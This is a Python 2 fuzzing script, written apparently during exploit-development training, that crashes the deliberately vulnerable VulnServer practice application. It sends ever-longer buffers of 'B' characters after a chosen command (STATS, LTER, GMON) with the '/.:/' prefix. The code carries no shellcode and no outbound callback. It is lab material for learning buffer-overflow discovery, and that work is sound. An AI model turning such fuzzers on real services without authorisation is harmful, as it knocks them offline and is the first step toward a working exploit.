#!/usr/bin/python

#
# This python script is to be used for VulnServer fuzzing
# I created it during following CTP training
# If you are reading this, you either need help with your fuzzing or enjoy
# my terrible humor. Either way, you are crazy ....
# enjoy!
#
import socket
import os
import sys
import time
#

#
# Six Arguments for all our VulnServer targets, including the script itself. 
#
if len(sys.argv) != 6:
    print "[-] Six arguments, really?\n"
    print "[-] Apparently, so\n"
    print "[-] Usage: ./thisfile.py <ip> <port> <param> <max size> <interval>\n" 
    print "[-] Example: ./thisfile.py 192.168.1.66 9999 STATS 200 10\n"
    print "[-] Max size is the largest payload to be sent (200 bytes)\n"
    print "[-] Interval is how much it will increase with each pass, starting from 1\n"
    print "[-] So, in the example above, the fuzz will increase by 10 characters, until it crashes something or not!\n"
    print "[-] Try Harder!\n"
    sys.exit()


print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script is designed fuzz the VulnServer given parameter (STATS, LTER, GMON)\n"
print "[-] You can change it to something else if you want!\n"
time.sleep(2)
#
# Define the script arguments.
# Hey what sucks more, added 5 arguments to a script, or rewriting the script everytime you need to change something?
# Answer, they suck equally but bash will let you arrow up your last xxx commands.
#
ip = sys.argv[1]
port = int(sys.argv[2])
param = sys.argv[3]
size = int(sys.argv[4])
interval =int(sys.argv[5])

#
# Port, Size and interval (above) need to be expressed as integers
#

# Define the variable "crash"

crash=["\x42"]
#
# Size of loop depends on max / increment. No idea what that will be. It is driven by user input!
#
loop=1

#
# Define cycle (max / interval) to make the while loop work
# So if you are some weirdo that picks odd numbers that do not divide evenly,
# Like size as a 355 and interval as 3 (which will have a remainder)...
# Well, the int command will make python not care.
# And I do not care either!
# Have fun
#
cycle=int(size/interval)

while len(crash) <=cycle:
    crash.append("\x42"*loop)
    loop=loop+interval

for string in crash:
    #
    # This is what GMON looks like in WireShark
    # I did not know about the /.:/ in the syntax until I saw sh3llcod3r's blog
    # You may have to experiement with the other parameters
    buffer=param
    buffer+=" /.:/" # GMON needs this, I do not know if the other params do.
    buffer+=string + "\n"

    print "[-] Here we going, sending a bunch of junk (I keep changing the letter), %s bytes to Vulnserver: " %len(string) + param

    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
    expl.connect((ip, port))
    expl.send("HELP\n")
    time.sleep(.25)
    expl.send(buffer)
    time.sleep(.25)
    expl.send("EXIT\n")
    expl.close
    time.sleep(.5) # Why rush

print "[-] Fuzz Cycle Complete\n"

exit()
